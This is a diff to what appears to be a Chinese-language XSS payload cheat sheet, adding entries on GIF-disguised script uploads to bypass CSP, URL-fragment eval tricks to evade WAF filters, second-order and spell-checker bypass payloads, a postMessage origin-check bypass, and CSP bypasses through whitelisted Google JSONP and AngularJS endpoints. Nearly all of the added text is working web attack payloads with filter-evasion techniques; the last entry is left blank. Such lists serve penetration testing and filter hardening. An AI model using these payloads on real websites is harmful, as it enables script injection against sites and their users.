@@ -317,6 +317,46 @@ ${alert(1)}<svg onload=eval('`//'+URL)>
 ```
 **50.File Upload Injection – HTML/js GIF Disguise (文件上传注入- HTML/js GIF伪装)** <br>
 以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为"xss.gif"或"xss.js"（用于严格的MIME检查）。这是PHP的image/gif文件,它可以通过`<link rel=import href=xss.gif>`（也称为"xss.js"）或`<script src=xss.js></script>`导入到目标web应用。<br>
+```
+GIF89a=//<script>
+alert(1)//</script>;
+```
+**51.Jump to URL Fragment (url分段跳转)** <br>
+例如，当我们需要在payload中隐藏一些会触发WAF的关键字符,可以在URL片段`（#）`之后使用各自的payload进行绕过。<br>
+
+```
+eval(URL.slice(-8)) #alert(1)
+eval(location.hash.slice(1)) #alert(1)
+document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+```
+**52.Second Order XSS Injection (二阶XSS注入)** <br>
+当我们的输入的内容将会被使用两次时，例如存储在数据库中，然后进行检索以供后面使用或插入到DOM中时,使用以下的payload进行测试 <br>
+```
+&lt;svg/onload&equals;alert(1)&gt;
+```
+**53.PHP Spell Checker Bypass (PHP拼写检查绕过)** <br>
+以下payload用于绕过PHP的pspell_new()函数，该函数提供一个字典来尝试猜测用于搜索的输入. <br>
+```
+<scrpt>confirm(1)</scrpt>
+```
+**54.Event Origin Bypass for postMessage() XSS (postMessage()事件源XSS绕过)** <br>
+以下payload用于在目标的javascript代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查的参数,用于发送payload攻击域的子域。在本地主机上使用CrossPwn脚本作为示例（在附加部分中进行提供）。<br>
+```
+http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
+status.html&msg=<script>alert(1)</script>
+```
+**55.CSP Bypass (for Whitelisted Google Domains) (CSP 绕过(通过谷歌白名单域名))** <br>
+以下payload用于,当存在允许这些白名单域执行CSP（内容安全策略）时使用。
+```
+<script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)>
+</script>
+<script src=//www.googleapis.com/customsearch/v1?callback=alert(1)></script>
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
+</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
+```
+**56.**
+
+
 
 
 ## 致谢
